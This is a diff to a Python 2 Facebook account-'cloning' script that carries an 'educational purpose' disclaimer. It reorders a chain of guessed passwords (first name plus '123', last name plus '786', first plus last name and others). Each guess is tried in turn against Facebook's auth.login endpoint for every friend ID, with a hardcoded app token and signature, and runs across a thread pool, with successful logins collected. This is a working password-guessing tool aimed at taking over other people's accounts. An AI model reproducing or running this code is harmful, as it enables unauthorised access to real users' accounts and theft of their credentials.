@@ -52,7 +52,7 @@ logo ="""
 \x1b[1;92m██║╚██╔╝██║██║░╚═══██╗██╔══██║██║
 \x1b[1;92m██║░╚═╝░██║██║██████╔╝██║░░██║██║
 \x1b[1;92m╚═╝░░░░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝
-\x1b[0;39m--------------------------------------------------- 
+\x1b[0;39m------------------------------------------------------- 
 \x1b[1;91m➣  Coded By : JAM SHAHRUKH
 \x1b[1;91m➣  YouTube  : JAM SHAHRUKH TECHNICAL
 \x1b[1;91m➣  Note     : Dont ReEdit It 
@@ -61,7 +61,7 @@ logo ="""
 \x1b[1;91m➣  Note     : Having Problem? Contact Me On Whatsapp.
 \x1b[1;91m➣  Disclamiar : This Is For Educational Purpose Only 
 Iam Not Responsible For Any Illegal Use Or Activity.
-\x1b[0;39m---------------------------------------------------"""
+\x1b[0;39m-------------------------------------------------------"""
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -89,7 +89,7 @@ while (loop == 'true'):
     	password = raw_input("\033[1;97mEnter Passcode \x1b[1;97m: \x1b[1;97m")
         if (password == CorrectPassword):
             print "\033[1;97mAccess Granted "#Dev:Jam_Shahrukh
-	    time.sleep(2)
+	    time.sleep(1)
             loop = 'false'
         else:
             print "\033[1;97mACCESS DENIED"
@@ -189,7 +189,7 @@ def menu():
 	print "	   \033[1;97m Name\033[1;97m:\033[1;97m"+nama+"\033[1;97m               "
 	print "	   \033[1;97m ID\033[1;97m:\033[1;97m"+id+"\x1b[1;97m              "
 	
-	print "\033[1;97m---------------------------------------------------"
+	print "\033[1;97m-------------------------------------------------------"
 		
 	print "\033[1;97m✧\033[1;97m.\033[1;97m1.\x1b[1;97m Start Cloning..."
       
@@ -279,10 +279,10 @@ def pilih_super():
         print"""
 [!] To Stop Process Press CTRL Then Z
 
----------------------------------------------------"""		
+-------------------------------------------------------"""		
 			
 	def main(arg):
-		global cekpoint,oks
+		global oks
 		user = arg
 		try:
 			os.mkdir('out')
@@ -319,28 +319,28 @@ def pilih_super():
                                                         print '\x1b[1;32mOK\x1b[1;32m \x1b[1;32m✮\x1b[1;32m ' + user + ' \x1b[1;32m✮\x1b[1;32m ' + pass4 + ' \x1b[1;32m✮\x1b[1;32m ' + b['name']
                                                         oks.append(user+pass4)
 						else:
-							pass5 = b['last_name'] + '786'
+							pass5 = b['first_name'] + '123'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
 								print '\x1b[1;32mOK\x1b[1;32m \x1b[1;32m✮\x1b[1;32m ' + user + ' \x1b[1;32m✮\x1b[1;32m ' + pass5 + ' \x1b[1;32m✮\x1b[1;32m ' + b['name']
 								oks.append(user+pass5)
 							else:
-								pass6 = b['first_name'] + '123'
+								pass6 = b['first_name'] + '1234'
                                                                 data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                 q = json.load(data)
                                                                 if 'access_token' in q:
                                                                         print '\x1b[1;32mOK\x1b[1;32m \x1b[1;32m✮\x1b[1;32m ' + user + ' \x1b[1;32m✮\x1b[1;32m ' + pass6 + ' \x1b[1;32m✮\x1b[1;32m ' + b['name']
                                                                         oks.append(user+pass6)
 								else:
-									pass7 = b['last_name'] + '123'
+									pass7 = b['first_name'] + '12345'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
 										print '\x1b[1;32mOK\x1b[1;32m \x1b[1;32m✮\x1b[1;32m ' + user + ' \x1b[1;32m✮\x1b[1;32m ' + pass7 + ' \x1b[1;32m✮\x1b[1;32m ' + b['name']
 										oks.append(user+pass7)
 									else:
-										pass8 = b['first_name'] + '1234'
+										pass8 = b['last_name'] + '786'
                                                                                 data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                 q = json.load(data)
                                                                                 if 'access_token' in q:
@@ -349,7 +349,7 @@ def pilih_super():
 										else:
 											a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 											b = json.loads(a.text)
-											pass9 = b['first_name'] + '12345'
+											pass9 = b['first_name'] + b['last_name']
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -360,7 +360,7 @@ def pilih_super():
 		except:
 			pass
 		
-	p = ThreadPool(50)
+	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;97m---------------------------------------------------"
 	
